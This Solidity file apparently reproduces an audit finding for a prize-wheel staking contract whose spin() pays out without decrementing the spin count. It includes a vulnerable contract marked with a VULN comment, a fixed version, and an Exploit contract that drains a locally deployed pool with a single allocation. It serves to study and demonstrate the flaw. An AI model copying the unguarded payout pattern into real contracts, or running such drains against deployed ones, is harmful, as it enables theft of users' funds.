// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Guanciale Stake — C-03 (Shieldify, December 2024)
    spin() pays a prize whenever getAvailableSpinsOf is non-zero, and never
    decreases that count. One allocated spin drains the prize pool.
*/

contract Token {
    string public symbol = "PRIZE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WheelOfGuantune {
    Token public prizeToken;
    uint256 public constant PRIZE = 10 ether;
    mapping(address => uint256) public extraSpins;

    constructor(Token _prize) {
        prizeToken = _prize;
    }

    function giveExtraSpins(address user, uint256 count) external {
        extraSpins[user] += count;
    }

    function getAvailableSpinsOf(address user) public view returns (uint256) {
        return extraSpins[user];
    }

    function spin() external virtual returns (uint256 available) {
        available = getAvailableSpinsOf(msg.sender);
        require(available > 0, "no spins");
        // @> VULN: the prize is paid and extraSpins is left unchanged, so the same allocation can be spent again
        require(prizeToken.transfer(msg.sender, PRIZE), "prize");
    }
}

contract WheelOfGuantuneFixed is WheelOfGuantune {
    constructor(Token _prize) WheelOfGuantune(_prize) {}

    function spin() external override returns (uint256 available) {
        available = extraSpins[msg.sender];
        require(available > 0, "no spins");
        extraSpins[msg.sender] = available - 1;
        require(prizeToken.transfer(msg.sender, PRIZE), "prize");
        available = extraSpins[msg.sender];
    }
}

contract Exploit {
    uint256 public constant ALLOCATION = 1;
    uint256 public constant DRAINS = 5;
    uint256 public constant PAYOUT = 50 ether;

    Token public prize;
    WheelOfGuantune public wheel;
    uint256 public taken;
    uint256 public spinsLeft;

    constructor() {
        prize = new Token();
        wheel = new WheelOfGuantune(prize);
        prize.mint(address(wheel), PAYOUT);
    }

    function run() external {
        wheel.giveExtraSpins(address(this), ALLOCATION);
        uint256 beforeSpin = wheel.getAvailableSpinsOf(address(this));
        require(beforeSpin == ALLOCATION, "allocated");
        require(prize.balanceOf(address(wheel)) == PAYOUT, "funded");

        wheel.spin();
        uint256 afterFirst = prize.balanceOf(address(this));
        uint256 still = wheel.getAvailableSpinsOf(address(this));
        require(afterFirst == 10 ether, "first prize");
        require(still == ALLOCATION, "not decreased");

        wheel.spin();
        wheel.spin();
        wheel.spin();
        wheel.spin();

        taken = prize.balanceOf(address(this));
        spinsLeft = wheel.getAvailableSpinsOf(address(this));
        require(spinsLeft == ALLOCATION, "allocation intact");
        require(taken == PAYOUT, "drained");
        require(prize.balanceOf(address(wheel)) == 0, "pool empty");
    }
}
